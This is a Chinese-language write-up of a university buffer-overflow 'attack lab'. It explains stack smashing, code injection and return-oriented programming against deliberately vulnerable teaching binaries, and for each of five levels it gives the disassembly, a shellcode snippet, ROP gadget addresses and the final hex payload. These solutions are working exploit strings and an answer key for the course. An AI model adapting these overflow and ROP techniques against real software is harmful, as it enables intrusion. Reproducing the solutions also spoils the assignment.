---
typora-root-url: img
---

本次lab的内容是利用程序的缓冲区溢出攻击程序。程序进行函数调用时会先把返回地址压入栈中，然后读入数据至缓冲区，若没有防止溢出的机制，过长的输入将覆盖返回地址，从而将程序导向其他地方（bomb！）

##### level1

从官方的手册可知，程序首先执行test()，在函数内调用getbuf()读入字符串然后结束返回test()，打印no exploit，我们要做的就是在打印no exploit之前将程序引向touch1引爆炸弹。

从getbuf入手，让它跳转至touch而非返回，来看getbuf的代码（先objdump ctarget）

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	move   %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
```

getbuf开辟0x28即40B的栈空间即缓冲区，用get读入字符串后返回，当然在开辟空间前还进行了test地址压栈。知道了这个栈帧情况就很容易攻击了，可以先读入40B字符，然后再读入touch1的地址，读入数据大于40B导致缓冲区溢出，最后读入的touch1地址将覆盖test的地址。

touch1的地址是0x4017c0，考虑小端存储答案为：

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00

![1](1.png)



##### level2

touch2需要读入一个参数，当参数为cookie时才能通过，根据提示知参数存在rdi里。源代码里没有输入cookie的语句，所以我们要自己编写相关代码，然后注入代码的地址，让程序执行指定的代码。

注入的代码应该实现两个功能：1、把cookie值移动到rdi中，2、跳转到touch2处

```assembly
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

使用gcc生成.o目标文件，然后反汇编生成汇编代码：

```assembly
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

这样就得到了我们的代码的地址，但怎么让程序执行它们（跳到该地址）呢？可以参考上一题借用test的返回地址，用这些地址的地址覆盖test的返回地址。这些地址的地址是什么？它们保存在getbuf的栈帧里，地址就是栈顶指针rsp的值。

利用gdb在getbuf分配完栈空间后即0x4017ac处打断点，r执行之后info r rsp查看执行完getbuf后rsp的值，得到结果为0x5561dc78。所以我们在前40B保存我们代码的地址，再利用缓冲区溢出覆盖test的返回地址，使程序到我们制定的地址执行我们的代码。

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

![2](2.png)



##### level3

本关也需要输入字符串然后匹配，touch3要读入字符串的地址，cookie存在哪？手册提示hexmatch使用了栈随机化，很可能覆盖getbuf的栈空间，应该把cookie存在test的栈帧里。

利用上面info r rsp的方法找到test的rsp指针0x5561dca8，要把cookie存到此处，在编写自己的代码是就把该地址放入rdi寄存器，touch3的地址是0x4018fa，所以汇编写成：

```assembly
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

反汇编后得到代码地址，同样要用gebuf的栈顶地址0x5561dc78覆盖test的返回地址，以便执行这些代码，然后读入cookie（要转为ascii码）

48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61

![3](3.png)



##### level4

上面三关是利用缓存区溢出进行代码注入攻击（CIA），后面的两关程序采用了防护方式无法进行代码注入，它们需使用面向返回（ROP）的攻击方式。

ROP的思路是既然无法注入自己的代码，那就在原代码中找我们需要的片段，然后拼凑成需要的程序

重复level2，我们需要把cookie的值移到rdi中，但不能编写汇编。可以先读入cookie，然后执行pop rdi，但给的gadget中没找到pop rdi，需要做一下中转。先找到pop rax的代码，查表知其编码为58，在rtarget的汇编中搜索58，可以在0x4019b5处找到，58具体的地址是0x4019ab

```assembly
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
```

再找mov rax rdi的汇编，其编码为48 89 c7，在如下地方找到，具体地址为0x4019a2

```assembly
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
```

于是有了答案：先读入40B空字符，然后分别读入0x4019ab、cookie、0x4019a2、touch2的地址

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

![4](4.png)



##### level5

实验做到这就差不多了，该掌握的方法都过了一遍，这关是一个大综合，需要组织汇编然后在rtarget中找到相应的gadget，和上题一样注入，最后答案为：

00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61

![5](5.png)

